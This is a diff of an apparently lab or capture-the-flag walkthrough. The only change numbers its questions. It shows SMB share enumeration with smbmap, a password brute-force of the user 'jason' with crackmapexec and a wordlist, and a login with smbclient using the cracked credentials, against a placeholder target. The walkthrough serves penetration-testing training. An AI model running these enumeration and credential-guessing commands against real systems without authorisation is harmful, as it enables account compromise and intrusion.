@@ -23,7 +23,7 @@
 
 ## Questions:
 
-### What is the name of the shared folder with READ permissions?
+### 1. What is the name of the shared folder with READ permissions?
 
 ```
 smbmap -H $TARGET_IP
@@ -36,13 +36,13 @@ smbmap -H $TARGET_IP
 
 ```
 
-### What is the password for the username "jason"?
+### 2. What is the password for the username "jason"?
 * First, load pwd.list from resources.
 ```
 crackmapexec smb $TARGET_IP -u jason -p pwd.list --local-auth
 ```
 
-### Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
+### 3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
 
 ``` 
 smbclient  //$TARGET_IP/GGJ -U 'jason%$PASSWORD' -
